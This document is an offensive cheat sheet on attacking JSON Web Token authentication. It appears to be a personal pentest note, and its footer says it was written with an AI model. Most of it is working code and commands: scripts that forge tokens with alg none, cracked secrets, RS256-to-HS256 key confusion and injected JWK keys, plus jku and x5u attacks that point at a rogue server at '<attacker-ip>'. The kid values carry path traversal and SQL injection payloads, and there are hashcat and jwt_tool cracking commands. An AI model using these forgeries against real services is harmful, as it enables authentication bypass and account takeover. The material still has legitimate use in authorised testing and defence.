# JWT Attacks

#JWT #Authentication #WebAppAttacks #APIAttacks


## What is this?

JSON Web Token attacks — algorithm confusion (RS256→HS256), none algorithm, weak secret brute-force, kid injection, and header injection. Pairs with [[OAuth-OIDC-SAML]], [[Web Attacks]].


---

## Tools

| Tool | Purpose |
|---|---|
| `jwt_tool` | Algorithm attacks, none alg, brute force, kid injection — `git clone https://github.com/ticarpi/jwt_tool` |
| `Burp JWT Editor` | In-proxy JWT modification and signing (BApp Store extension) |
| `hashcat` | Brute-force HS256/HS384/HS512 secrets — `hashcat -a 0 -m 16500 <jwt> wordlist.txt` |
| `john` | Alternative JWT secret cracking — `john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256` |
| `jwt.io` | Manual decode/inspect (offline use only for sensitive tokens) |

---

## Structure & Decoding

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
           HEADER (b64url)                          PAYLOAD (b64url)                           SIGNATURE (b64url)
```

```bash
# Decode manually — split on '.' and base64 decode each part
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool   # header
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool   # payload
# Signature is binary — don't decode as text

# Python one-liner decode
python3 -c "
import base64, json, sys
t = '$TOKEN'.split('.')
for i, part in enumerate(t[:2]):
    pad = part + '=' * (4 - len(part) % 4)
    print(f'--- Part {i} ---')
    print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)), indent=2))
"

# jwt_tool — install
pip3 install termcolor cprint pycryptodomex requests
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && python3 jwt_tool.py <token>   # decode and display

# Online: jwt.io — paste token to decode (don't use for real engagement tokens)
```

---

## Algorithm: None Attack

When the server accepts `alg: none` — no signature required. Works on unpatched libraries.

```bash
# Manual — build alg:none token
python3 << 'EOF'
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1234", "role": "admin", "iat": 1700000000}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',',':')).encode()).rstrip(b'=').decode()

token = f"{b64url(header)}.{b64url(payload)}."
print(token)
EOF

# jwt_tool — none attack
python3 jwt_tool.py <token> -X a

# Variations — some parsers require lowercase/mixed case:
# "alg": "none"
# "alg": "None"
# "alg": "NONE"
# "alg": "nOnE"
# Try all variants:
for alg in none None NONE nOnE; do
python3 -c "
import base64, json
h = json.dumps({'alg':'$alg','typ':'JWT'}, separators=(',',':')).encode()
p = json.dumps({'sub':'1','role':'admin'}, separators=(',',':')).encode()
hb = base64.urlsafe_b64encode(h).rstrip(b'=').decode()
pb = base64.urlsafe_b64encode(p).rstrip(b'=').decode()
print(f'$alg: {hb}.{pb}.')
"
done
```

---

## Weak Secret Brute Force (HS256/HS384/HS512)

HMAC algorithms use a shared secret. If weak, crack offline.

```bash
# hashcat — mode 16500 (JWT HS256/384/512)
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 <token> /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# Custom rules
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force short secrets (≤8 chars)
hashcat -a 3 -m 16500 <token> "?a?a?a?a?a?a"

# john the ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt
# jwt.txt format: just the raw token on one line

# jwt_tool brute force
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to try first:
# secret, password, 123456, test, jwt, key, admin, changeme, qwerty
# <appname>, <domain>, <year>, blank string

# Once cracked — forge with new claims
python3 << 'EOF'
import hmac, hashlib, base64, json

secret = b"secret"   # cracked secret
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "1", "role": "admin", "iat": 1700000000}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',',':')).encode()).rstrip(b'=').decode()

header_b64 = b64url(header)
payload_b64 = b64url(payload)
signing_input = f"{header_b64}.{payload_b64}".encode()
sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{header_b64}.{payload_b64}.{sig_b64}")
EOF

# jwt_tool — sign with known secret
python3 jwt_tool.py <token> -T -S hs256 -p "secret"
# -T = tamper mode (prompts for claim changes)
# -S hs256 -p "secret" = sign with algorithm + secret
```

---

## Algorithm Confusion: RS256 → HS256

If server uses RS256 (asymmetric), the public key is often exposed. If the server accepts HS256 and uses the public key as the HMAC secret — forge tokens by signing with the public key as a shared secret.

```bash
# Step 1: Get the public key
# From JWKS endpoint:
curl -s "https://<target>/.well-known/jwks.json"
curl -s "https://<target>/api/jwks"
curl -s "https://<target>/auth/jwks.json"

# Extract the cert from the response / server TLS cert:
openssl s_client -connect <target>:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem
# Or from JWKS n/e values — convert to PEM:
python3 << 'EOF'
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
import base64, json, requests

jwks = requests.get("https://<target>/.well-known/jwks.json").json()
key = jwks['keys'][0]
n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')
pub = RSAPublicNumbers(e, n).public_key()
pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
print(pem.decode())
EOF

# Step 2: Forge HS256 token signed with public key as secret
python3 << 'EOF'
import hmac, hashlib, base64, json

with open("pubkey.pem", "rb") as f:
    secret = f.read()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "1", "role": "admin", "iat": 1700000000}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',',':')).encode()).rstrip(b'=').decode()

h = b64url(header)
p = b64url(payload)
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}")
EOF

# jwt_tool — algorithm confusion attack
python3 jwt_tool.py <token> -X k -pk pubkey.pem
# -X k = key confusion attack
```

---

## JWK Header Injection

If the server trusts a `jwk` embedded in the token header, inject your own RSA key.

```bash
# jwt_tool — inject JWK
python3 jwt_tool.py <token> -X i
# Generates RSA keypair, embeds public key in header JWK field, signs with private key

# Manual:
python3 << 'EOF'
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import base64, json

# Generate RSA key
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = priv.public_key()
pub_nums = pub.public_key().public_numbers()   # n, e

def b64url_int(i):
    b = i.to_bytes((i.bit_length() + 7) // 8, 'big')
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

jwk = {"kty": "RSA", "n": b64url_int(pub_nums.n), "e": b64url_int(pub_nums.e)}
header = {"alg": "RS256", "typ": "JWT", "jwk": jwk}
payload = {"sub": "1", "role": "admin"}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()

h, p = b64url(header), b64url(payload)
sig = priv.sign(f"{h}.{p}".encode(), padding.PKCS1v15(), hashes.SHA256())
print(f"{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}")
EOF
```

---

## `kid` (Key ID) Injection

The `kid` header parameter selects which key to verify with. If used in a file path or SQL query — path traversal or SQLi.

```bash
# Path traversal via kid — use /dev/null as key (empty secret)
# Header: {"alg": "HS256", "kid": "../../dev/null", "typ": "JWT"}
# HMAC signed with empty string as secret

python3 << 'EOF'
import hmac, hashlib, base64, json

# Sign with empty string (content of /dev/null)
secret = b""
header = {"alg": "HS256", "kid": "../../../../../../dev/null", "typ": "JWT"}
payload = {"sub": "1", "role": "admin"}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()

h, p = b64url(header), b64url(payload)
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}")
EOF

# SQLi via kid — inject into SQL query used to fetch key
# kid: "x' UNION SELECT 'mysecret'-- -"
# Then sign the token with 'mysecret'
python3 << 'EOF'
import hmac, hashlib, base64, json

secret = b"mysecret"
header = {"alg": "HS256", "kid": "x' UNION SELECT 'mysecret'-- -", "typ": "JWT"}
payload = {"sub": "1", "role": "admin"}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()

h, p = b64url(header), b64url(payload)
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}")
EOF

# jwt_tool — kid injection tests
python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
python3 jwt_tool.py <token> -I -hc kid -hv "x' UNION SELECT 'pwned'-- -" -S hs256 -p "pwned"
```

---

## Claim Tampering

```bash
# Identify and tamper claims with jwt_tool interactive mode
python3 jwt_tool.py <token> -T
# Prompts: change each claim value, then select signing method

# Common claims to tamper:
# role: "user" → "admin"
# sub: "5" → "1" (admin user ID)
# iss: change issuer
# exp: set to far future (9999999999)
# email: change to admin@target.com
# isAdmin: false → true
# groups: ["users"] → ["admins"]

# Check expiry — if expired, try sending anyway (some apps don't validate exp)
python3 -c "
import base64, json, time
t = '<token>'.split('.')
p = json.loads(base64.urlsafe_b64decode(t[1] + '=='))
exp = p.get('exp', 'not set')
print(f'exp: {exp} = {time.strftime(\"%Y-%m-%d %H:%M\", time.gmtime(exp)) if isinstance(exp, int) else exp}')
print(f'now: {int(time.time())} = {time.strftime(\"%Y-%m-%d %H:%M\", time.gmtime())}')
"

# Remove signature entirely (not same as alg:none — just strip last segment)
# Some apps only decode payload without verifying
echo "<header>.<payload>."
```

---

## `jku` / `x5u` / `x5c` Header Injection

If server fetches keys from a URL in the token header, point it at your server. Three header variants — all same concept, different key format.

```bash
# Step 1: Generate RSA keypair and JWKS
python3 << 'EOF'
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import base64, json

priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = priv.public_key()
n = pub.public_numbers().n
e = pub.public_numbers().e

def b64url_int(i):
    return base64.urlsafe_b64encode(i.to_bytes((i.bit_length()+7)//8,'big')).rstrip(b'=').decode()

jwks = {"keys": [{"kty": "RSA", "use": "sig", "kid": "attacker", "n": b64url_int(n), "e": b64url_int(e)}]}
print("JWKS:")
print(json.dumps(jwks, indent=2))

# Save private key
with open("attacker.pem", "wb") as f:
    f.write(priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
EOF

# Step 2: Host JWKS on attacker server
mkdir -p /tmp/jwks && echo '{"keys":[...]}' > /tmp/jwks/jwks.json
python3 -m http.server 8000 --directory /tmp/jwks

# Step 3: Forge token with jku pointing to your server
python3 jwt_tool.py <token> -X s -ju "http://<attacker-ip>:8000/jwks.json"

# Filter bypass — jku whitelist checks
# Try: https://<trusted-domain>@<attacker-ip>/jwks.json
# Try: https://<trusted-domain>.attacker.com/jwks.json
# Or combine with open redirect on target

# x5u — server fetches X.509 cert from URL and uses public key from cert
# Same attack as jku but server expects a PEM-encoded certificate at the URL, not JWKS
python3 << 'EOF'
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
import datetime, base64, json

# Generate key + self-signed cert
priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = priv.public_key()
subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"attacker")])
cert = (x509.CertificateBuilder()
    .subject_name(subject).issuer_name(issuer)
    .public_key(pub).serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.utcnow())
    .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
    .sign(priv, hashes.SHA256()))

with open("/tmp/attacker.crt", "wb") as f:
    f.write(cert.public_bytes(serialization.Encoding.PEM))
with open("/tmp/attacker.key", "wb") as f:
    f.write(priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
print("Cert and key written to /tmp/")
EOF
# Host cert: python3 -m http.server 8000 --directory /tmp
# Forge token with x5u pointing to your cert:
python3 jwt_tool.py <token> -I -hc x5u -hv "http://<attacker-ip>:8000/attacker.crt" -T -S rs256 -pr /tmp/attacker.key

# x5c — embed certificate chain directly in header (no URL fetch)
# Server uses public key from the embedded cert to verify — inject your own cert
python3 << 'EOF'
import base64, json
# Base64-encode the DER form of the cert (not PEM — strip headers and decode)
with open("/tmp/attacker.crt") as f:
    pem = f.read()
der_b64 = pem.strip().replace("-----BEGIN CERTIFICATE-----","").replace("-----END CERTIFICATE-----","").replace("\n","")
print(f'"x5c": ["{der_b64}"]')
# Add this to JWT header, sign with matching private key
EOF
```

---

## jwt_tool — Full Reference

```bash
# Install
pip3 install termcolor cprint pycryptodomex requests
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool

# Decode + analyze
python3 jwt_tool.py <token>

# Tamper claims interactively
python3 jwt_tool.py <token> -T

# Run all standard attacks
python3 jwt_tool.py <token> -X -v

# Specific attacks:
python3 jwt_tool.py <token> -X a          # alg:none
python3 jwt_tool.py <token> -X n          # null signature
python3 jwt_tool.py <token> -X k -pk pubkey.pem   # key confusion RS256→HS256
python3 jwt_tool.py <token> -X i          # JWK injection
python3 jwt_tool.py <token> -X s -ju "http://<attacker>/jwks.json"  # jku spoofing

# Sign with known secret
python3 jwt_tool.py <token> -T -S hs256 -p "secret"
python3 jwt_tool.py <token> -T -S rs256 -pr private.pem

# Inject specific header/claim
python3 jwt_tool.py <token> -I -hc alg -hv none         # set header claim
python3 jwt_tool.py <token> -I -pc role -pv admin        # set payload claim

# Brute force secret
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Scan endpoint for JWT vulnerabilities
python3 jwt_tool.py <token> -t "https://<target>/api/profile" -rh "Authorization: Bearer <token>" -M pb
```

---

## Clock Skew — `exp` / `nbf` Tolerance Bypass

Many JWT libraries allow a configurable leeway window (typically ±5 minutes) around `exp` and `nbf` to account for clock drift between services. You can abuse this to:

- **Use expired tokens** — tokens expired within the leeway window may still validate
- **Pre-activate tokens** — `nbf` (not-before) set slightly in the future still accepted within leeway

```bash
# Check current exp value
python3 -c "
import base64, json, time
t = '<token>'.split('.')
p = json.loads(base64.urlsafe_b64decode(t[1] + '=='))
exp = p.get('exp'); nbf = p.get('nbf')
now = int(time.time())
print(f'now:  {now}')
print(f'exp:  {exp}  (diff: {exp - now}s)' if exp else 'exp: not set')
print(f'nbf:  {nbf}  (diff: {nbf - now}s)' if nbf else 'nbf: not set')
"

# Forge token with exp just expired (within 5 min window) — some servers accept
python3 << 'EOF'
import hmac, hashlib, base64, json, time

secret = b"secret"
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "1",
    "role": "admin",
    "exp": int(time.time()) - 60,   # expired 60s ago — within ±5min leeway
    "nbf": int(time.time()) - 300
}

def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()

h, p = b64url(header), b64url(payload)
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
print(f"{h}.{p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}")
EOF

# jwt_tool — modify exp claim then sign
python3 jwt_tool.py <token> -I -pc exp -pv 9999999999 -S hs256 -p "<secret>"
```

> [!note] The default leeway in many libraries (PyJWT, jsonwebtoken, java-jwt) is 0 but apps often set it to 60-300s. Worth testing with tokens expired 1-5 minutes ago before assuming exp is enforced.

---

## Where to Find JWTs

```bash
# Request headers
Authorization: Bearer <jwt>
X-Auth-Token: <jwt>

# Cookies
Cookie: token=<jwt>; session=<jwt>; jwt=<jwt>; access_token=<jwt>

# Response bodies — search for eyJ (Base64url header start)
curl -s "https://<target>/api/login" -d '{"user":"x","pass":"y"}' | grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'

# Browser storage (from JS console):
# localStorage.getItem('token')
# sessionStorage.getItem('jwt')
# document.cookie

# Burp: search proxy history for "eyJ"
```

---

## Quick Reference

```bash
# Decode token
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Crack secret (hashcat)
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt

# alg:none via jwt_tool
python3 jwt_tool.py <token> -X a

# Key confusion (RS256 → HS256)
python3 jwt_tool.py <token> -X k -pk pubkey.pem

# Tamper + resign with known secret
python3 jwt_tool.py <token> -T -S hs256 -p "secret"

# kid path traversal (sign with empty string)
python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# Run all attacks
python3 jwt_tool.py <token> -X -v
```

---

*Created: 2026-03-04*
*Updated: 2026-05-14*
*Model: claude-sonnet-4-6*